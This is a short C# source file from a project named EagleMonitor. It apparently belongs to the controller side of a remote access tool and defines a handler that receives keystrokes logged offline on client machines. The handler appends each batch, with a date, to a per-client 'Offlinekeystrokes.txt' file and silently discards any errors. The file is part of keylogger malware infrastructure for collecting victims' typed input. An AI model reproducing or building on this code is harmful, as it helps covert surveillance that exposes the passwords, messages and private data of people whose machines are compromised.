using EagleMonitor.Networking;
using PacketLib.Packet;
using System.IO;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class KeylogOfflinePacketHandler
    {
        public KeylogOfflinePacketHandler(KeylogOfflinePacket keylogOfflinePacket, ClientHandler clientHandler)
        {
            try
            {
                File.AppendAllText(ClientHandler.ClientHandlersList[keylogOfflinePacket.baseIp].clientPath + "\\Keystrokes\\" + "Offlinekeystrokes.txt", keylogOfflinePacket.keyStroke + "\n--------------------------------------------\nDATE : " + Utils.Miscellaneous.DateFormater() + "\n--------------------------------------------\n");
            }
            catch { }
        }
    }
}
